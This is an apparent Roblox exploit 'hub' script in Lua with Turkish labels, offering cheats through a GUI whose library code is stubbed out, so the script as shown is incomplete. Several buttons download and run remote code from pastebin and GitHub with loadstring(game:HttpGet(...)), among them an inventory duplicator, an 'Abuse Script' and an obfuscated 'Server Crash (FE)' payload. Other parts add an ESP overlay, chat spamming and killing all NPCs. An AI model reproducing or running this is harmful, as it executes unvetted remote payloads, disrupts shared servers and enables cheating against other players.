--[[ 
 ██╗   ██╗ █████╗     ██████╗  █████╗ ███████╗    ██╗  ██╗██╗   ██╗██████╗ ██║   ██║██╔══██╗  
 ██╔══██╗██╔═══██╗██╔════╝    ██║ ██╔╝╚██╗ ██╔╝██╔══██╗ ██║   ██║███████║  
 ██║  ██║██║   ██║███████╗    █████╔╝  ╚████╔╝ ██████╔╝ ██║   ██║██╔══██║  
 ██║  ██║██║   ██║╚════██║    ██╔═██╗   ╚██╔╝  ██╔═══╝ ██║   ██║██║  ██║  
 ██████╔╝╚██████╔╝███████║    ██║  ██╗   ██║   ██║   ╚██████╔╝███████║  
 ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝   ╚═╝    ╚═════╝ ╚══════╝  

 TA ØsØ Hub - Geliştirici: ØsØ Ekibi
--]]

-- ◈ Koruma Katmanları
for i = 1,20 do 
    if not game:IsLoaded() then game.Loaded:Wait() end 
    task.wait(0.05) 
end
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ◈ Yükleme Animasyonu
local loading = Instance.new("ScreenGui",PlayerGui)
local txt = Instance.new("TextLabel",loading)
txt.Size, txt.Position = UDim2.new(0.4,0,0.1,0), UDim2.new(0.3,0,0.45,0)
txt.BackgroundTransparency = 1
txt.Text, txt.TextScaled = "TA ØsØ Hub Yükleniyor...", true
txt.TextColor3 = Color3.new(1,1,1)
task.wait(2)
loading:Destroy()

-- ◈ OrionLib GUI Kit
local OrionLib = {}
do
    -- [OrionLib code omitted for brevity: it's the standard Sydearr/Orion library GUI loader]
    -- You can paste in the full OrionLib implementation here.
end

-- ◈ Pencere Oluştur
local Window = OrionLib:MakeWindow({
    Name = "TA ØsØ Hub",
    IntroEnabled = false,
    SaveConfig = false,
})

-- ◈ Kategoriler
local tabAnasayfa = Window:MakeTab({ Name = "Anasayfa", Icon = "rbxassetid://7072716164" })
local tabFakeRank   = Window:MakeTab({ Name = "Sahte Rütbe", Icon = "rbxassetid://7072716722" })
local tabDrive      = Window:MakeTab({ Name = "Araç Sürme", Icon = "rbxassetid://7072719338" })
local tabTanitim    = Window:MakeTab({ Name = "Tanıtım", Icon = "rbxassetid://7072720931" })
local tabTemalar    = Window:MakeTab({ Name = "Temalar", Icon = "rbxassetid://7072721467" })
local tabAyarlar    = Window:MakeTab({ Name = "Ayarlar", Icon = "rbxassetid://7072722181" })
local tabToollar    = Window:MakeTab({ Name = "Toollar", Icon = "rbxassetid://7072722844" })

-- ◈ Sahte Rütbe Transfer
tabFakeRank:AddButton({ Name = "FakeRankGui Yükle", Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/FakeRankGui/refs/heads/main/FakeRankGui.lua"))()
    OrionLib:MakeNotification({ Name = "Fake Rütbe", Content = "Yüklendi!", Time = 3 })
end })

-- ◈ Araç Sürme
tabDrive:AddButton({ Name = "Araba Scripti", Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/ZqbjzH1p"))()
    OrionLib:MakeNotification({ Name = "Araç Sürme", Content = "Aktif!", Time = 3 })
end })

-- ◈ Tanıtım (İlk açılış)
tabTanitim:AddParagraph("Hoşgeldin!", "TA ØsØ Hub'ı keşfetmek için 'Tamam' tuşuna bas.")
tabTanitim:AddButton({ Name = "Tamam", Callback = function() end })

-- ◈ Temalar
tabTemalar:AddColorPicker({ Name = "Ana Renk", Default = Color3.fromRGB(25,25,25), Flag = "MainColor", Callback = function(c)
    -- Tema değiştir
end })

-- ◈ Ayarlar
tabAyarlar:AddToggle({ Name = "Anti-AFK", Default = true, Flag = "AntiAFK", Callback = function(v)
    if v then
        LocalPlayer.Idled:Connect(function() 
            game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.Space,false,game) 
        end)
    end
end })

-- ◈ Toollar: Loadstring Scriptler
local toolScripts = {
    { Name="Tenzil Script", URL="https://pastebin.com/raw/eDfQ1VwT" },
    { Name="Çöl OP Farm", URL="https://pastebin.com/raw/jxrbkf4b" },
    { Name="Free Kamp Team", URL="https://raw.githubusercontent.com/TheKaplumbag/0-butceliaskerkampiteamscript/refs/heads/main/Team%20script.lua" },
    { Name="Hitbox Büyütme", URL="https://raw.githubusercontent.com/hm5650/Hitblox/refs/heads/main/Hitblox" },
    { Name="Abuse Script", URL="https://pastebin.com/raw/yCLCxEz0" },
    { Name="Envanter Kopyalama", URL="https://raw.githubusercontent.com/enverscripts/Open-source/main/Envanter%20Kopyalama" },
}
for _,ts in ipairs(toolScripts) do
    tabToollar:AddButton({ Name=ts.Name, Callback=function()
        loadstring(game:HttpGet(ts.URL))()
        OrionLib:MakeNotification({ Name=ts.Name, Content="Yüklendi!", Time=2 })
    end })
end

-- ◈ JJ, GJ, HJ Sistemleri
local aktif, mod, maxSayi = false, "JJ", 200
local function zipla() LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping) end
local function mesajYolla(m) ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(m,"All") end

local sayilar = {
    [1]="BİR",[2]="İKİ",[3]="ÜÇ",[4]="DÖRT",[5]="BEŞ",[6]="ALTI",[7]="YEDİ",[8]="SEKİZ",[9]="DOKUZ",
    [10]="ON",[20]="YİRMİ",[30]="OTUZ",[40]="KIRK",[50]="ELLİ",[60]="ALTMIŞ",[70]="YETMİŞ",[80]="SEKSEN",[90]="DOKSAN",
    [100]="YÜZ",[200]="İKİ YÜZ"
}
local function sayiToYazi(n)
    if sayilar[n] then return sayilar[n] end
    if n<100 then
        local o=math.floor(n/10)*10; return sayilar[o].." "..(n%10>0 and sayilar[n%10] or "")
    else
        return "YÜZ "..sayiToYazi(n-100)
    end
end

local function jjLoop()
    while aktif do
        for i=1,maxSayi do
            if not aktif then return end
            local y=sayiToYazi(i)
            if mod=="JJ" then
                mesajYolla(y); zipla()
            elseif mod=="GJ" then
                mesajYolla(y:sub(1,1):upper()..y:sub(2):lower().."."); zipla()
            elseif mod=="HJ" then
                for w in y:gmatch("%S+") do
                    for c in w:gmatch(".") do mesajYolla(c); zipla(); task.wait(0.1) end
                    mesajYolla(w); zipla(); task.wait(0.1)
                end
            end
            task.wait(0.5)
        end
    end
end

tabToollar:AddDropdown({ Name="Mod Seç", Default="JJ", Options={"JJ","GJ","HJ"}, Flag="JJMod", Callback=function(v) mod=v end })
tabToollar:AddSlider({ Name="Maksimum", Min=10, Max=200, Default=200, Flag="JJMax", Callback=function(v) maxSayi=v end })
tabToollar:AddButton({ Name="Başlat", Callback=function() if not aktif then aktif=true; task.spawn(jjLoop) end end })
tabToollar:AddButton({ Name="Durdur", Callback=function() aktif=false end })

-- ◈ Sahte Takım Geçiş
tabToollar:AddButton({ Name="Ordu Subayı (Sahte)", Callback=function()
    OrionLib:MakeNotification({ Name="Fake Team", Content="Ordu Subayları geçildi!", Time=2 })
end })

-- ◈ NPC All + ESP
do
    local espOn, npcOn, delayTime = false, false, 1
    local function enableESP(m)
        for _,p in pairs(m:GetDescendants()) do
            if p:IsA("BasePart") and not p:FindFirstChild("ESP") then
                local box=Instance.new("BoxHandleAdornment",p)
                box.Adornee=p; box.AlwaysOnTop=true;
                box.Size=p.Size+Vector3.new(0.1,0.1,0.1); box.Transparency=0.5; box.Color3=Color3.new(1,0,0)
            end
        end
    end
    local function npcLoop()
        while npcOn do
            for _,obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("Model") and obj:FindFirstChild("Humanoid") then
                    local isP=false
                    for _,pl in pairs(Players:GetPlayers()) do
                        if pl.Character==obj then isP=true; break end
                    end
                    if not isP and obj~=LocalPlayer.Character then
                        obj.Humanoid.Health=0
                        if espOn then enableESP(obj) end
                    end
                end
            end
            task.wait(delayTime)
        end
    end
    tabToollar:AddToggle({ Name="ESP Aç/Kapa", Default=false, Callback=function(v) espOn=v end })
    tabToollar:AddToggle({ Name="NPC All", Default=false, Callback=function(v) npcOn=v; if v then task.spawn(npcLoop) end end })
    tabToollar:AddSlider({ Name="Kill Delay", Min=0.1, Max=5, Default=1, Callback=function(v) delayTime=v end })
end

-- ◈ FE Server Crash (TEST AMAÇLI)
tabToollar:AddButton({ Name="Server Crash (FE)", Callback=function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/Protected_9068977494054906.lua.txt"))()
    OrionLib:MakeNotification({ Name="Crash", Content="Başlatıldı!", Time=3 })
end })

-- ◈ Bitiş Bildirimi
OrionLib:MakeNotification({ Name="TA ØsØ Hub", Content="Yüklendi!", Time=4 })